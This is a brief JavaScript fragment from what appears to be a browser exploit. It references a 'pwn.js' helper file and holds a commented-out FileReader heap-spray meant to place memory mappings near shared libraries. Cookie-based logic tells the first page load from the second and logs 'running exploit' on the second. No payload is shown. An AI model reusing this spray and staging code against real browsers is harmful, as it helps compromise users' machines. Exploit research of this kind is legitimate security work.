// at this point the service worker has been registered, also we defined
// some utility functions in pwn.js

// spray some mappings so we can get one in a relative position that is before mapped solibs
/*var filereaders = [];
for(let x = 0; x < 0x100; x++) {
	let blob = new Blob(["A".repeat(0x40)], {type : 'application/json'});
	let fr = new FileReader();
	filereaders.push(fr);
	fr.readAsArrayBuffer(blob, 0x2000);
}
//log(filereaders);
let blob = new Blob(["A".repeat(0x40)], {type : 'application/json'});
let fr = new FileReader();*/
//fr.readAsArrayBuffer(blob, 0x41414141);

log("checking which pageload we are on");

var is_active = false;

if (document.cookie.indexOf("A=G") == -1) {
	log("first pageload, doing refresh...");
	document.cookie = "A=G";
	//setTimeout(function() { location.reload(); }, 1000);
	is_active = true;
} else {
	document.cookie = "A=D";
	log("second pageload, running exploit...");
	//is_active = true;
}